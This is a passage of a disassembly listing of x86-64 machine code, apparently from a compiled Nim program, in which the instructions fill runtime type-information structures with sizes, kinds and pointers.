  408951:	c6 05 48 ce 01 00 02 	movb   $0x2,0x1ce48(%rip)        # 4257a0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589>
  408958:	48 c7 05 dd 15 02 00 	movq   $0x8,0x215dd(%rip)        # 429f40 <NTI__WF89a8QyKeDCh4DYWTmSiBg_>
  40895f:	08 00 00 00 
  408963:	c6 05 de 15 02 00 18 	movb   $0x18,0x215de(%rip)        # 429f48 <NTI__WF89a8QyKeDCh4DYWTmSiBg_+0x8>
  40896a:	48 c7 05 ab cd 01 00 	movq   $0x30,0x1cdab(%rip)        # 425720 <NTI__XEycrCsme5C8CVWAYEcdBQ_>
  408971:	30 00 00 00 
  408975:	c6 05 ac cd 01 00 11 	movb   $0x11,0x1cdac(%rip)        # 425728 <NTI__XEycrCsme5C8CVWAYEcdBQ_+0x8>
  40897c:	48 89 2d ad cd 01 00 	mov    %rbp,0x1cdad(%rip)        # 425730 <NTI__XEycrCsme5C8CVWAYEcdBQ_+0x10>
  408983:	c6 05 36 cf 01 00 01 	movb   $0x1,0x1cf36(%rip)        # 4258c0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x120>
  40898a:	48 c7 05 33 cf 01 00 	movq   $0x8,0x1cf33(%rip)        # 4258c8 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x128>
  408991:	08 00 00 00 
  408995:	4c 89 25 34 cf 01 00 	mov    %r12,0x1cf34(%rip)        # 4258d0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x130>
  40899c:	48 c7 05 09 cd 01 00 	movq   $0x0,0x1cd09(%rip)        # 4256b0 <NTI__S9agCYBinaYZnGWcjTdxclg_+0x10>
  4089a3:	00 00 00 00 
  4089a7:	48 c7 05 ee cc 01 00 	movq   $0x8,0x1ccee(%rip)        # 4256a0 <NTI__S9agCYBinaYZnGWcjTdxclg_>
  4089ae:	08 00 00 00 
  4089b2:	66 c7 05 ed cc 01 00 	movw   $0x31d,0x1cced(%rip)        # 4256a8 <NTI__S9agCYBinaYZnGWcjTdxclg_+0x8>
  4089b9:	1d 03 
  4089bb:	c6 05 2e cf 01 00 01 	movb   $0x1,0x1cf2e(%rip)        # 4258f0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x150>
  4089c2:	48 c7 05 2b cf 01 00 	movq   $0x10,0x1cf2b(%rip)        # 4258f8 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x158>
  4089c9:	10 00 00 00 
  4089cd:	48 c7 05 38 24 02 00 	movq   $0x0,0x22438(%rip)        # 42ae10 <NTI__77mFvmsOLKik79ci2hXkHEg_+0x10>
  4089d4:	00 00 00 00 
  4089d8:	48 c7 05 1d 24 02 00 	movq   $0x8,0x2241d(%rip)        # 42ae00 <NTI__77mFvmsOLKik79ci2hXkHEg_>
  4089df:	08 00 00 00 
  4089e3:	66 c7 05 1c 24 02 00 	movw   $0x21c,0x2241c(%rip)        # 42ae08 <NTI__77mFvmsOLKik79ci2hXkHEg_+0x8>
  4089ea:	1c 02 
  4089ec:	c6 05 2d cf 01 00 01 	movb   $0x1,0x1cf2d(%rip)        # 425920 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x180>
  4089f3:	48 c7 05 2a cf 01 00 	movq   $0x18,0x1cf2a(%rip)        # 425928 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x188>
  4089fa:	18 00 00 00 
  4089fe:	48 89 3d 2b cf 01 00 	mov    %rdi,0x1cf2b(%rip)        # 425930 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x190>
  408a05:	48 89 15 ec cc 01 00 	mov    %rdx,0x1ccec(%rip)        # 4256f8 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_4_5.56586+0x18>
  408a0c:	48 83 c2 60          	add    $0x60,%rdx
  408a10:	48 89 15 29 cc 01 00 	mov    %rdx,0x1cc29(%rip)        # 425640 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_5_3.56587>
  408a17:	48 8d 15 b0 38 00 00 	lea    0x38b0(%rip),%rdx        # 40c2ce <.rdata+0x2ce>
  408a1e:	48 89 15 a3 cf 01 00 	mov    %rdx,0x1cfa3(%rip)        # 4259c8 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x228>
  408a25:	48 8d 15 b4 cf 01 00 	lea    0x1cfb4(%rip),%rdx        # 4259e0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x240>
  408a2c:	48 89 05 8d cf 01 00 	mov    %rax,0x1cf8d(%rip)        # 4259c0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x220>
  408a33:	48 89 15 0e cc 01 00 	mov    %rdx,0x1cc0e(%rip)        # 425648 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_5_3.56587+0x8>
  408a3a:	48 8d 15 96 38 00 00 	lea    0x3896(%rip),%rdx        # 40c2d7 <.rdata+0x2d7>
  408a41:	48 89 05 d8 cf 01 00 	mov    %rax,0x1cfd8(%rip)        # 425a20 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x280>
  408a48:	48 8d 05 8d 38 00 00 	lea    0x388d(%rip),%rax        # 40c2dc <.rdata+0x2dc>
  408a4f:	48 89 15 a2 cf 01 00 	mov    %rdx,0x1cfa2(%rip)        # 4259f8 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x258>
  408a56:	48 8d 15 b3 cf 01 00 	lea    0x1cfb3(%rip),%rdx        # 425a10 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x270>
  408a5d:	48 89 05 c4 cf 01 00 	mov    %rax,0x1cfc4(%rip)        # 425a28 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x288>
  408a64:	48 8d 05 d5 cb 01 00 	lea    0x1cbd5(%rip),%rax        # 425640 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_5_3.56587>
  408a6b:	48 89 05 36 cf 01 00 	mov    %rax,0x1cf36(%rip)        # 4259a8 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x208>
  408a72:	48 8d 82 70 ff ff ff 	lea    -0x90(%rdx),%rax
  408a79:	48 89 05 f8 cb 01 00 	mov    %rax,0x1cbf8(%rip)        # 425678 <NTI__oLyohQ7O2XOvGnflOss8EA_+0x18>
  408a80:	48 8d 05 d9 cb 01 00 	lea    0x1cbd9(%rip),%rax        # 425660 <NTI__oLyohQ7O2XOvGnflOss8EA_>
  408a87:	48 89 05 82 cb 01 00 	mov    %rax,0x1cb82(%rip)        # 425610 <NTI__uB9b75OUPRENsBAu4AnoePA_+0x10>
  408a8e:	48 8d 05 9c 8b ff ff 	lea    -0x7464(%rip),%rax        # 401631 <Marker_tySequence__uB9b75OUPRENsBAu4AnoePA>
  408a95:	48 89 05 8c cb 01 00 	mov    %rax,0x1cb8c(%rip)        # 425628 <NTI__uB9b75OUPRENsBAu4AnoePA_+0x28>
  408a9c:	48 8d 05 5d cb 01 00 	lea    0x1cb5d(%rip),%rax        # 425600 <NTI__uB9b75OUPRENsBAu4AnoePA_>
  408aa3:	48 89 05 b6 ce 01 00 	mov    %rax,0x1ceb6(%rip)        # 425960 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x1c0>
  408aaa:	48 8d 05 34 38 00 00 	lea    0x3834(%rip),%rax        # 40c2e5 <.rdata+0x2e5>
  408ab1:	48 89 15 98 cb 01 00 	mov    %rdx,0x1cb98(%rip)        # 425650 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_5_3.56587+0x10>
  408ab8:	48 c7 05 ad cb 01 00 	movq   $0x0,0x1cbad(%rip)        # 425670 <NTI__oLyohQ7O2XOvGnflOss8EA_+0x10>
  408abf:	00 00 00 00 
  408ac3:	48 c7 05 92 cb 01 00 	movq   $0x18,0x1cb92(%rip)        # 425660 <NTI__oLyohQ7O2XOvGnflOss8EA_>
  408aca:	18 00 00 00 
  408ace:	66 c7 05 91 cb 01 00 	movw   $0x312,0x1cb91(%rip)        # 425668 <NTI__oLyohQ7O2XOvGnflOss8EA_+0x8>
  408ad5:	12 03 
  408ad7:	c6 05 d2 ce 01 00 01 	movb   $0x1,0x1ced2(%rip)        # 4259b0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x210>
  408ade:	48 c7 05 cf ce 01 00 	movq   $0x0,0x1cecf(%rip)        # 4259b8 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x218>
  408ae5:	00 00 00 00 
  408ae9:	48 c7 05 7c 1d 02 00 	movq   $0x0,0x21d7c(%rip)        # 42a870 <NTI__rR5Bzr1D5krxoo1NcNyeMA_+0x10>
  408af0:	00 00 00 00 
  408af4:	48 c7 05 61 1d 02 00 	movq   $0x8,0x21d61(%rip)        # 42a860 <NTI__rR5Bzr1D5krxoo1NcNyeMA_>
  408afb:	08 00 00 00 
  408aff:	66 c7 05 60 1d 02 00 	movw   $0x31f,0x21d60(%rip)        # 42a868 <NTI__rR5Bzr1D5krxoo1NcNyeMA_+0x8>
  408b06:	1f 03 
  408b08:	c6 05 d1 ce 01 00 01 	movb   $0x1,0x1ced1(%rip)        # 4259e0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x240>
  408b0f:	48 c7 05 ce ce 01 00 	movq   $0x8,0x1cece(%rip)        # 4259e8 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x248>
  408b16:	08 00 00 00 
  408b1a:	4c 89 3d cf ce 01 00 	mov    %r15,0x1cecf(%rip)        # 4259f0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x250>
  408b21:	c6 05 e8 ce 01 00 01 	movb   $0x1,0x1cee8(%rip)        # 425a10 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x270>
  408b28:	48 c7 05 e5 ce 01 00 	movq   $0x10,0x1cee5(%rip)        # 425a18 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x278>
  408b2f:	10 00 00 00 
  408b33:	48 c7 05 62 ce 01 00 	movq   $0x3,0x1ce62(%rip)        # 4259a0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x200>
  408b3a:	03 00 00 00 
  408b3e:	c6 05 3b ce 01 00 02 	movb   $0x2,0x1ce3b(%rip)        # 425980 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x1e0>
  408b45:	48 c7 05 b0 ca 01 00 	movq   $0x8,0x1cab0(%rip)        # 425600 <NTI__uB9b75OUPRENsBAu4AnoePA_>
  408b4c:	08 00 00 00 
  408b50:	66 c7 05 af ca 01 00 	movw   $0x218,0x1caaf(%rip)        # 425608 <NTI__uB9b75OUPRENsBAu4AnoePA_+0x8>
  408b57:	18 02 
  408b59:	c6 05 f0 cd 01 00 01 	movb   $0x1,0x1cdf0(%rip)        # 425950 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x1b0>
  408b60:	48 c7 05 ed cd 01 00 	movq   $0x20,0x1cded(%rip)        # 425958 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x1b8>
  408b67:	20 00 00 00 
  408b6b:	48 89 05 f6 cd 01 00 	mov    %rax,0x1cdf6(%rip)        # 425968 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x1c8>
  408b72:	48 8d 42 30          	lea    0x30(%rdx),%rax
  408b76:	48 89 05 83 cb 01 00 	mov    %rax,0x1cb83(%rip)        # 425700 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_4_5.56586+0x20>
  408b7d:	48 8d 05 67 37 00 00 	lea    0x3767(%rip),%rax        # 40c2eb <.rdata+0x2eb>
  408b84:	48 89 05 cd ce 01 00 	mov    %rax,0x1cecd(%rip)        # 425a58 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x2b8>
  408b8b:	48 8d 05 4e cb 01 00 	lea    0x1cb4e(%rip),%rax        # 4256e0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_4_5.56586>
  408b92:	48 89 05 1f cd 01 00 	mov    %rax,0x1cd1f(%rip)        # 4258b8 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x118>
  408b99:	48 8d 82 80 fe ff ff 	lea    -0x180(%rdx),%rax
  408ba0:	48 89 05 91 cb 01 00 	mov    %rax,0x1cb91(%rip)        # 425738 <NTI__XEycrCsme5C8CVWAYEcdBQ_+0x18>
  408ba7:	48 8d 05 8b a6 ff ff 	lea    -0x5975(%rip),%rax        # 403239 <Marker_tyRef__vU9aO9cTqOMn6CBzhV8rX7Sw>
  408bae:	48 89 05 93 15 02 00 	mov    %rax,0x21593(%rip)        # 42a148 <NTI__vU9aO9cTqOMn6CBzhV8rX7Sw_+0x28>
  408bb5:	48 8d 05 b4 ce 01 00 	lea    0x1ceb4(%rip),%rax        # 425a70 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x2d0>
  408bbc:	48 89 05 15 ca 01 00 	mov    %rax,0x1ca15(%rip)        # 4255d8 <NTI__LbeSGvgPzGzXnW9caIkJqMA_+0x18>
  408bc3:	48 83 c0 30          	add    $0x30,%rax
  408bc7:	48 89 05 ca c9 01 00 	mov    %rax,0x1c9ca(%rip)        # 425598 <NTI__Wyd9avMRCq0gsOu9adFoIjCA_+0x18>
  408bce:	48 8d 05 ab c9 01 00 	lea    0x1c9ab(%rip),%rax        # 425580 <NTI__Wyd9avMRCq0gsOu9adFoIjCA_>
  408bd5:	48 8d 15 e4 c9 01 00 	lea    0x1c9e4(%rip),%rdx        # 4255c0 <NTI__LbeSGvgPzGzXnW9caIkJqMA_>
  408bdc:	48 89 05 6d c9 01 00 	mov    %rax,0x1c96d(%rip)        # 425550 <NTI__DsOOBcxCUeVlNUDRmn9afcA_+0x10>
  408be3:	48 8d 05 49 a7 ff ff 	lea    -0x58b7(%rip),%rax        # 403333 <Marker_tyRef__DsOOBcxCUeVlNUDRmn9afcA>
  408bea:	48 89 0d 3f 15 02 00 	mov    %rcx,0x2153f(%rip)        # 42a130 <NTI__vU9aO9cTqOMn6CBzhV8rX7Sw_+0x10>
  408bf1:	48 89 0d d8 c9 01 00 	mov    %rcx,0x1c9d8(%rip)        # 4255d0 <NTI__LbeSGvgPzGzXnW9caIkJqMA_+0x10>
  408bf8:	48 89 15 91 c9 01 00 	mov    %rdx,0x1c991(%rip)        # 425590 <NTI__Wyd9avMRCq0gsOu9adFoIjCA_+0x10>
  408bff:	48 89 05 62 c9 01 00 	mov    %rax,0x1c962(%rip)        # 425568 <NTI__DsOOBcxCUeVlNUDRmn9afcA_+0x28>
  408c06:	48 8d 05 c3 ce 01 00 	lea    0x1cec3(%rip),%rax        # 425ad0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x330>
  408c0d:	48 89 15 fc c8 01 00 	mov    %rdx,0x1c8fc(%rip)        # 425510 <NTI__XIT9aewsXycM2U5B437NUDA_+0x10>
  408c14:	c6 05 25 ce 01 00 01 	movb   $0x1,0x1ce25(%rip)        # 425a40 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x2a0>
  408c1b:	48 c7 05 22 ce 01 00 	movq   $0x28,0x1ce22(%rip)        # 425a48 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x2a8>
  408c22:	28 00 00 00 
  408c26:	4c 89 25 23 ce 01 00 	mov    %r12,0x1ce23(%rip)        # 425a50 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x2b0>
  408c2d:	48 c7 05 78 cc 01 00 	movq   $0x5,0x1cc78(%rip)        # 4258b0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x110>
  408c34:	05 00 00 00 
  408c38:	c6 05 51 cc 01 00 02 	movb   $0x2,0x1cc51(%rip)        # 425890 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0xf0>
  408c3f:	48 c7 05 d6 14 02 00 	movq   $0x8,0x214d6(%rip)        # 42a120 <NTI__vU9aO9cTqOMn6CBzhV8rX7Sw_>
  408c46:	08 00 00 00 
  408c4a:	c6 05 d7 14 02 00 16 	movb   $0x16,0x214d7(%rip)        # 42a128 <NTI__vU9aO9cTqOMn6CBzhV8rX7Sw_+0x8>
  408c51:	48 c7 05 64 c9 01 00 	movq   $0x30,0x1c964(%rip)        # 4255c0 <NTI__LbeSGvgPzGzXnW9caIkJqMA_>
  408c58:	30 00 00 00 
  408c5c:	c6 05 65 c9 01 00 11 	movb   $0x11,0x1c965(%rip)        # 4255c8 <NTI__LbeSGvgPzGzXnW9caIkJqMA_+0x8>
  408c63:	48 c7 05 22 ce 01 00 	movq   $0x0,0x1ce22(%rip)        # 425a90 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x2f0>
  408c6a:	00 00 00 00 
  408c6e:	c6 05 fb cd 01 00 02 	movb   $0x2,0x1cdfb(%rip)        # 425a70 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x2d0>
  408c75:	48 c7 05 00 c9 01 00 	movq   $0x30,0x1c900(%rip)        # 425580 <NTI__Wyd9avMRCq0gsOu9adFoIjCA_>
  408c7c:	30 00 00 00 
  408c80:	c6 05 01 c9 01 00 11 	movb   $0x11,0x1c901(%rip)        # 425588 <NTI__Wyd9avMRCq0gsOu9adFoIjCA_+0x8>
  408c87:	48 c7 05 2e ce 01 00 	movq   $0x0,0x1ce2e(%rip)        # 425ac0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x320>
  408c8e:	00 00 00 00 
  408c92:	c6 05 07 ce 01 00 02 	movb   $0x2,0x1ce07(%rip)        # 425aa0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x300>
  408c99:	48 c7 05 9c c8 01 00 	movq   $0x8,0x1c89c(%rip)        # 425540 <NTI__DsOOBcxCUeVlNUDRmn9afcA_>
  408ca0:	08 00 00 00 
  408ca4:	c6 05 9d c8 01 00 16 	movb   $0x16,0x1c89d(%rip)        # 425548 <NTI__DsOOBcxCUeVlNUDRmn9afcA_+0x8>
  408cab:	48 c7 05 4a c8 01 00 	movq   $0x30,0x1c84a(%rip)        # 425500 <NTI__XIT9aewsXycM2U5B437NUDA_>
  408cb2:	30 00 00 00 
  408cb6:	c6 05 4b c8 01 00 11 	movb   $0x11,0x1c84b(%rip)        # 425508 <NTI__XIT9aewsXycM2U5B437NUDA_+0x8>
  408cbd:	48 c7 05 28 ce 01 00 	movq   $0x0,0x1ce28(%rip)        # 425af0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x350>
  408cc4:	00 00 00 00 
  408cc8:	48 89 0d 81 c7 01 00 	mov    %rcx,0x1c781(%rip)        # 425450 <NTI__qrLSDoe2oBoAqNtJ9badtnA_+0x10>
  408ccf:	48 8d 0d 5a ce 01 00 	lea    0x1ce5a(%rip),%rcx        # 425b30 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x390>
  408cd6:	48 89 05 3b c8 01 00 	mov    %rax,0x1c83b(%rip)        # 425518 <NTI__XIT9aewsXycM2U5B437NUDA_+0x18>
  408cdd:	48 8d 05 1c c8 01 00 	lea    0x1c81c(%rip),%rax        # 425500 <NTI__XIT9aewsXycM2U5B437NUDA_>
  408ce4:	48 89 0d 6d c7 01 00 	mov    %rcx,0x1c76d(%rip)        # 425458 <NTI__qrLSDoe2oBoAqNtJ9badtnA_+0x18>
  408ceb:	48 8d 0d ce c6 01 00 	lea    0x1c6ce(%rip),%rcx        # 4253c0 <NTI__sVg18TP9cLifHyygRe9cro9aA_>
  408cf2:	48 89 05 d7 c7 01 00 	mov    %rax,0x1c7d7(%rip)        # 4254d0 <NTI__Ss6DFlX5iSZpHRZDmP74bg_+0x10>
  408cf9:	48 8d 05 00 ce 01 00 	lea    0x1ce00(%rip),%rax        # 425b00 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x360>
  408d00:	48 89 0d 69 ce 01 00 	mov    %rcx,0x1ce69(%rip)        # 425b70 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x3d0>
  408d07:	48 8d 0d e0 35 00 00 	lea    0x35e0(%rip),%rcx        # 40c2ee <.rdata+0x2ee>
  408d0e:	48 89 05 c3 c7 01 00 	mov    %rax,0x1c7c3(%rip)        # 4254d8 <NTI__Ss6DFlX5iSZpHRZDmP74bg_+0x18>
  408d15:	48 8d 05 a4 c7 01 00 	lea    0x1c7a4(%rip),%rax        # 4254c0 <NTI__Ss6DFlX5iSZpHRZDmP74bg_>
  408d1c:	48 89 0d 55 ce 01 00 	mov    %rcx,0x1ce55(%rip)        # 425b78 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x3d8>
  408d23:	48 8d 0d 36 ce 01 00 	lea    0x1ce36(%rip),%rcx        # 425b60 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x3c0>
  408d2a:	48 89 05 5f c7 01 00 	mov    %rax,0x1c75f(%rip)        # 425490 <NTI__Pjt0MQjoA6TAHAHOFNel9cg_+0x10>
  408d31:	48 8d 05 bb a5 ff ff 	lea    -0x5a45(%rip),%rax        # 4032f3 <Marker_tyRef__Pjt0MQjoA6TAHAHOFNel9cg>
  408d38:	48 89 0d d9 c6 01 00 	mov    %rcx,0x1c6d9(%rip)        # 425418 <NTI__BeJgrOdDsczOwEWOZbRfKA_+0x18>
  408d3f:	48 8d 0d ba c6 01 00 	lea    0x1c6ba(%rip),%rcx        # 425400 <NTI__BeJgrOdDsczOwEWOZbRfKA_>
  408d46:	48 89 05 5b c7 01 00 	mov    %rax,0x1c75b(%rip)        # 4254a8 <NTI__Pjt0MQjoA6TAHAHOFNel9cg_+0x28>
  408d4d:	48 8d 05 ec c6 01 00 	lea    0x1c6ec(%rip),%rax        # 425440 <NTI__qrLSDoe2oBoAqNtJ9badtnA_>
  408d54:	48 89 0d 35 c6 01 00 	mov    %rcx,0x1c635(%rip)        # 425390 <NTI__9clYsYwyjCqe2PFTuCI3Ubg_+0x10>
  408d5b:	48 8d 0d 15 a5 ff ff 	lea    -0x5aeb(%rip),%rcx        # 403277 <Marker_tyRef__9clYsYwyjCqe2PFTuCI3Ubg>
  408d62:	48 89 05 a7 c6 01 00 	mov    %rax,0x1c6a7(%rip)        # 425410 <NTI__BeJgrOdDsczOwEWOZbRfKA_+0x10>
  408d69:	c6 05 60 cd 01 00 02 	movb   $0x2,0x1cd60(%rip)        # 425ad0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x330>
  408d70:	48 c7 05 45 c7 01 00 	movq   $0x30,0x1c745(%rip)        # 4254c0 <NTI__Ss6DFlX5iSZpHRZDmP74bg_>
  408d77:	30 00 00 00 
  408d7b:	c6 05 46 c7 01 00 11 	movb   $0x11,0x1c746(%rip)        # 4254c8 <NTI__Ss6DFlX5iSZpHRZDmP74bg_+0x8>
  408d82:	48 c7 05 93 cd 01 00 	movq   $0x0,0x1cd93(%rip)        # 425b20 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x380>
  408d89:	00 00 00 00 
  408d8d:	c6 05 6c cd 01 00 02 	movb   $0x2,0x1cd6c(%rip)        # 425b00 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x360>
  408d94:	48 c7 05 e1 c6 01 00 	movq   $0x8,0x1c6e1(%rip)        # 425480 <NTI__Pjt0MQjoA6TAHAHOFNel9cg_>
  408d9b:	08 00 00 00 
  408d9f:	c6 05 e2 c6 01 00 16 	movb   $0x16,0x1c6e2(%rip)        # 425488 <NTI__Pjt0MQjoA6TAHAHOFNel9cg_+0x8>
  408da6:	48 c7 05 8f c6 01 00 	movq   $0x30,0x1c68f(%rip)        # 425440 <NTI__qrLSDoe2oBoAqNtJ9badtnA_>
  408dad:	30 00 00 00 
  408db1:	c6 05 90 c6 01 00 11 	movb   $0x11,0x1c690(%rip)        # 425448 <NTI__qrLSDoe2oBoAqNtJ9badtnA_+0x8>
  408db8:	48 c7 05 8d cd 01 00 	movq   $0x0,0x1cd8d(%rip)        # 425b50 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x3b0>
  408dbf:	00 00 00 00 
  408dc3:	c6 05 66 cd 01 00 02 	movb   $0x2,0x1cd66(%rip)        # 425b30 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x390>
  408dca:	48 c7 05 2b c6 01 00 	movq   $0x38,0x1c62b(%rip)        # 425400 <NTI__BeJgrOdDsczOwEWOZbRfKA_>
  408dd1:	38 00 00 00 
  408dd5:	c6 05 2c c6 01 00 11 	movb   $0x11,0x1c62c(%rip)        # 425408 <NTI__BeJgrOdDsczOwEWOZbRfKA_+0x8>
  408ddc:	48 c7 05 e9 c5 01 00 	movq   $0x0,0x1c5e9(%rip)        # 4253d0 <NTI__sVg18TP9cLifHyygRe9cro9aA_+0x10>
  408de3:	00 00 00 00 
  408de7:	48 c7 05 ce c5 01 00 	movq   $0x4,0x1c5ce(%rip)        # 4253c0 <NTI__sVg18TP9cLifHyygRe9cro9aA_>
  408dee:	04 00 00 00 
  408df2:	66 c7 05 cd c5 01 00 	movw   $0x322,0x1c5cd(%rip)        # 4253c8 <NTI__sVg18TP9cLifHyygRe9cro9aA_+0x8>
  408df9:	22 03 
  408dfb:	c6 05 5e cd 01 00 01 	movb   $0x1,0x1cd5e(%rip)        # 425b60 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x3c0>
  408e02:	48 c7 05 5b cd 01 00 	movq   $0x30,0x1cd5b(%rip)        # 425b68 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x3c8>
  408e09:	30 00 00 00 
  408e0d:	48 c7 05 68 c5 01 00 	movq   $0x8,0x1c568(%rip)        # 425380 <NTI__9clYsYwyjCqe2PFTuCI3Ubg_>
  408e14:	08 00 00 00 
  408e18:	c6 05 69 c5 01 00 16 	movb   $0x16,0x1c569(%rip)        # 425388 <NTI__9clYsYwyjCqe2PFTuCI3Ubg_+0x8>
  408e1f:	48 89 0d 82 c5 01 00 	mov    %rcx,0x1c582(%rip)        # 4253a8 <NTI__9clYsYwyjCqe2PFTuCI3Ubg_+0x28>
  408e26:	48 8d 0d d3 c4 01 00 	lea    0x1c4d3(%rip),%rcx        # 425300 <NTI__k3HXouOuhqAKq0dx450lXQ_>
  408e2d:	48 89 0d 9c c4 01 00 	mov    %rcx,0x1c49c(%rip)        # 4252d0 <NTI__6H5Oh5UUvVCLiakt9aTwtUQ_+0x10>
  408e34:	48 8d 0d 99 87 ff ff 	lea    -0x7867(%rip),%rcx        # 4015d4 <Marker_tySequence__6H5Oh5UUvVCLiakt9aTwtUQ>
  408e3b:	48 89 0d a6 c4 01 00 	mov    %rcx,0x1c4a6(%rip)        # 4252e8 <NTI__6H5Oh5UUvVCLiakt9aTwtUQ_+0x28>
  408e42:	48 8d 0d 47 cd 01 00 	lea    0x1cd47(%rip),%rcx        # 425b90 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x3f0>
  408e49:	48 89 0d 48 c4 01 00 	mov    %rcx,0x1c448(%rip)        # 425298 <NTI__KFG1Y2EPzgtJWwuYhMD0Fw_+0x18>
  408e50:	48 8d 0d 29 c4 01 00 	lea    0x1c429(%rip),%rcx        # 425280 <NTI__KFG1Y2EPzgtJWwuYhMD0Fw_>
  408e57:	48 89 0d f2 c3 01 00 	mov    %rcx,0x1c3f2(%rip)        # 425250 <NTI__M8bPR1OE5OXPYGyQdVHfTg_+0x10>
  408e5e:	48 8d 0d d0 a4 ff ff 	lea    -0x5b30(%rip),%rcx        # 403335 <Marker_tyRef__M8bPR1OE5OXPYGyQdVHfTg>
  408e65:	48 89 05 24 c4 01 00 	mov    %rax,0x1c424(%rip)        # 425290 <NTI__KFG1Y2EPzgtJWwuYhMD0Fw_+0x10>
  408e6c:	48 89 0d f5 c3 01 00 	mov    %rcx,0x1c3f5(%rip)        # 425268 <NTI__M8bPR1OE5OXPYGyQdVHfTg_+0x28>
  408e73:	48 8d 0d 86 c3 01 00 	lea    0x1c386(%rip),%rcx        # 425200 <NTI__yoNlBGx0D2tRizIdhQuENw_>
  408e7a:	48 89 05 8f c3 01 00 	mov    %rax,0x1c38f(%rip)        # 425210 <NTI__yoNlBGx0D2tRizIdhQuENw_+0x10>
  408e81:	4c 89 05 90 c3 01 00 	mov    %r8,0x1c390(%rip)        # 425218 <NTI__yoNlBGx0D2tRizIdhQuENw_+0x18>
  408e88:	48 c7 05 3d 17 02 00 	movq   $0x0,0x2173d(%rip)        # 42a5d0 <NTI__Aav8dQoMlCFnZRxA0IhTHQ_+0x10>
  408e8f:	00 00 00 00 
  408e93:	48 c7 05 22 17 02 00 	movq   $0x8,0x21722(%rip)        # 42a5c0 <NTI__Aav8dQoMlCFnZRxA0IhTHQ_>
  408e9a:	08 00 00 00 
  408e9e:	66 c7 05 21 17 02 00 	movw   $0x323,0x21721(%rip)        # 42a5c8 <NTI__Aav8dQoMlCFnZRxA0IhTHQ_+0x8>
  408ea5:	23 03 
  408ea7:	48 c7 05 be 12 02 00 	movq   $0x0,0x212be(%rip)        # 42a170 <NTI__VaVACK0bpYmqIQ0mKcHfQQ_+0x10>
  408eae:	00 00 00 00 
  408eb2:	48 c7 05 a3 12 02 00 	movq   $0x1,0x212a3(%rip)        # 42a160 <NTI__VaVACK0bpYmqIQ0mKcHfQQ_>
  408eb9:	01 00 00 00 
